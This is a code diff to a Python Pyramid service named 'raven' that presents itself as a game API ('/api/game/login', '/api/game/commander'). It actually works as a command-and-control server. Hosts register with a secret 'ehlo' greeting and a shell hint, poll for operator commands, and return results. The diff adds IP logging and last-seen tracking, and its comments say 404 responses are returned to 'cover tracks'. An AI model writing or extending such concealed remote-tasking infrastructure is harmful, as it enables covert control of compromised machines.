@@ -4,20 +4,18 @@ from secrets import token_hex
 from pyramid.httpexceptions import HTTPNoContent, HTTPBadRequest, HTTPNotFound
 from datetime import datetime
 
-
-raven_registration = Service(name='ravenreg',
-                             path='/api/game/login',
-                             description='Setup uid, key')
-
+# Operator Endpoints
 raven_operator_cuid = Service(name='ravenopuid',
                               path='/api/game/commander/{cuid}',
                               description='Operator tasks with a single cuid')
 
-
 raven_operator_task = Service(name='ravenoptask',
                               path='/api/game/commander/{cuid}/{tuid}',
                               description='Single task in a cuid')
-
+# Client Endpoints
+raven_registration = Service(name='ravenreg',
+                             path='/api/game/login',
+                             description='Setup uid, key')
 
 raven_task_board = Service(name='raventask',
                            path='/api/game',
@@ -78,19 +76,20 @@ def get_login(request):
     :param request:
     :return:
     """
-    # super secure SMTP keyword gets you keys to be commanded
+    # Pre-chosen SMTP greeting gets you in TODO probably secure this
     if 'ehlo' in request.POST.keys():
-        client = Client(cuid=token_hex(8), key=token_hex(16),
-                        shell_hint=request.POST['ehlo'])
         now = datetime.now()
+        client = Client(cuid=token_hex(8), key=token_hex(16),
+                        shell_hint=request.POST['ehlo'],
+                        first_seen=now, last_seen=now)
+        request.dbsession.add(client)
         address = Address(address=request.environ['REMOTE_ADDR'],
                           first_seen=now, last_seen=now)
-        request.dbsession.add(client)
         address.client = client
         request.dbsession.add(address)
         return {'cuid': client.cuid, 'key': client.key}
 
-    raise HTTPNotFound()  # thinly veiled cover up
+    raise HTTPNotFound()  # Return 404 in unexpected cases, cover tracks
 
 
 @raven_task_board.post()
@@ -104,20 +103,35 @@ def get_task(request):
         cuid = request.POST['cuid']
         key = request.POST['key']
         sesh = request.dbsession
+        now = datetime.now()
 
         if sesh.query(Client).filter_by(cuid=cuid, key=key).count():
+            # Grab client, update last_seen
             client = sesh.query(Client).filter_by(cuid=cuid,
                                                   key=key).one()
+            client.last_seen = now
+
+            addy = request.environ['REMOTE_ADDR']
+            # See if this address is already associated with us
+            if sesh.query(Address).filter_by(address=addy).count():
+                address = sesh.query(Address).filter_by(address=addy).one()
+                address.last_seen = now
+            else: # Create a new address if it's not already there
+                address = Address(address=addy, first_seen=now, last_seen=now)
+                address.client = client
+                request.dbsession.add(address)
+            # Get pending status
             pending = sesh.query(Status).filter_by(pending=True).one()
             if sesh.query(Task).filter_by(client=client,
                                           status=pending).count():
+                # Find the task, update status, send task to client
                 task = sesh.query(Task).filter_by(client=client,
                                                   status=pending).one()
                 status = sesh.query(Status).filter_by(running=True).one()
                 task.status = status
                 return {'tuid': task.tuid, 'cmd': task.command}
             return HTTPNoContent()
-    raise HTTPNotFound()
+    raise HTTPNotFound()  # Return 404 in unexpected cases, cover tracks
 
 
 @raven_task_board.put()
@@ -133,13 +147,28 @@ def add_results(request):
         tuid = request.POST['tuid']
         results = request.POST['data']
         sesh = request.dbsession
+        now = datetime.now()
 
         if sesh.query(Client).filter_by(cuid=cuid, key=key).count():
+            # Grab client, update last_seen
             client = sesh.query(Client).filter_by(cuid=cuid,
                                                   key=key).one()
+            client.last_seen = now
+
+            addy = request.environ['REMOTE_ADDR']
+            # See if this address is already associated with us
+            if sesh.query(Address).filter_by(address=addy).count():
+                address = sesh.query(Address).filter_by(address=addy).one()
+                address.last_seen = now
+            else:  # Create a new address if it's not already there
+                address = Address(address=addy, first_seen=now, last_seen=now)
+                address.client = client
+                request.dbsession.add(address)
+            # Get running status
             running_status = sesh.query(Status).filter_by(running=True).one()
             if sesh.query(Task).filter_by(client=client, tuid=tuid,
                                           status=running_status).count():
+                # Find the task, update status, add results and completion time
                 task = sesh.query(Task).\
                     filter_by(client=client, tuid=tuid).one()
                 status = sesh.query(Status).filter_by(done=True).one()
@@ -147,5 +176,5 @@ def add_results(request):
                 task.status = status
                 task.completed = datetime.now()
                 return {'success': True}
-    raise HTTPNotFound()
+    raise HTTPNotFound()  # Return 404 in unexpected cases, cover tracks
 
